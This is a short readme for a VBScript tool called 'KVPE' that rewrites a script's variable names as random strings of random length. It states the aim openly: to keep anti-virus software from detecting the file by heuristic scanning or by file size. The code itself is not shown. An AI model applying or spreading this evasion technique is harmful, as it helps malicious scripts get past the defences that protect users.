How to use KVPE:
 1. Make a list of every variable in your VBS file
 2. Add it them at the line given
 3. Add the following code to the bottom of your VBS file

 -

Significance:
  This script will replace your variables with a randomly created string with
 a random length. By doing this Anti-Viruses will not be able to pick them
 up with heuristic scanning, or by the file's size.

 -

Disclaimer:
  This code is for educational purposes only. I will not be held responsible
 for your actions with this script.
  If you are to use this script in your VBS file you MUST contact me first. I
 do not want this method spread.

 -

Note:
  On run this file will create new varibles in your file, which will be hard
 to work with, I sujest not running the file until it is finished.
